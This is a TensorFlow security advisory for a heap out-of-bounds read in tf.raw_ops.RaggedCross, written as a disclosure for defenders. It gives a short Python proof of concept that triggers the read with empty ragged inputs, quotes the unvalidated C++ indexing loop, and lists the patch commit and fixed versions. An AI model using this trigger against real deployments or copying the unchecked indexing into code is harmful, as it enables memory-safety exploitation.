summary: "Heap out of bounds read in `RaggedCross`\n### Impact\nAn attacker can force accesses\
  \ outside the bounds of heap allocated arrays by passing in invalid tensor values to `tf.raw_ops.RaggedCross`:\n\
  \n```python\nimport tensorflow as tf\n\nragged_values = []\nragged_row_splits = [] \nsparse_indices\
  \ = []\nsparse_values = []\nsparse_shape = []\n\ndense_inputs_elem = tf.constant([], shape=[92,\
  \ 0], dtype=tf.int64)\ndense_inputs = [dense_inputs_elem]\n\ninput_order = \"R\"\nhashed_output\
  \ = False\nnum_buckets = 0\nhash_key = 0 \n\ntf.raw_ops.RaggedCross(ragged_values=ragged_values,\n\
  \    ragged_row_splits=ragged_row_splits,\n    sparse_indices=sparse_indices,\n    sparse_values=sparse_values,\n\
  \    sparse_shape=sparse_shape,\n    dense_inputs=dense_inputs,\n    input_order=input_order,\n\
  \    hashed_output=hashed_output,\n    num_buckets=num_buckets,\n    hash_key=hash_key,\n\
  \    out_values_type=tf.int64,\n    out_row_splits_type=tf.int64)\n```\n\nThis is because\
  \ the [implementation](https://github.com/tensorflow/tensorflow/blob/efea03b38fb8d3b81762237dc85e579cc5fc6e87/tensorflow/core/kernels/ragged_cross_op.cc#L456-L487)\
  \ lacks validation for the user supplied arguments:\n\n```cc\nint next_ragged = 0;\nint next_sparse\
  \ = 0;\nint next_dense = 0;\nfor (char c : input_order_) {\n  if (c == 'R') {\n    TF_RETURN_IF_ERROR(BuildRaggedFeatureReader(\n\
  \        ragged_values_list[next_ragged], ragged_splits_list[next_ragged],\n        features));\n\
  \    next_ragged++;\n  } else if (c == 'S') {\n    TF_RETURN_IF_ERROR(BuildSparseFeatureReader(\n\
  \        sparse_indices_list[next_sparse], sparse_values_list[next_sparse],\n        batch_size,\
  \ features));\n    next_sparse++;\n  } else if (c == 'D') {\n    TF_RETURN_IF_ERROR(\n   \
  \     BuildDenseFeatureReader(dense_list[next_dense++], features));\n  }\n  ...\n}\n```\n\n\
  Each of the above branches call a helper function after accessing array elements via a `*_list[next_*]`\
  \ pattern, followed by incrementing the `next_*` index. However, as there is no validation\
  \ that the `next_*` values are in the valid range for the corresponding `*_list` arrays, this\
  \ results in heap OOB reads.\n\n### Patches\nWe have patched the issue in GitHub commit [44b7f486c0143f68b56c34e2d01e146ee445134a](https://github.com/tensorflow/tensorflow/commit/44b7f486c0143f68b56c34e2d01e146ee445134a).\n\
  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow\
  \ 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected\
  \ and still in supported range.\n\n### For more information\nPlease consult [our security\
  \ guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information\
  \ regarding the security model and how to contact us with issues and questions.\n\n### Attribution\n\
  This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
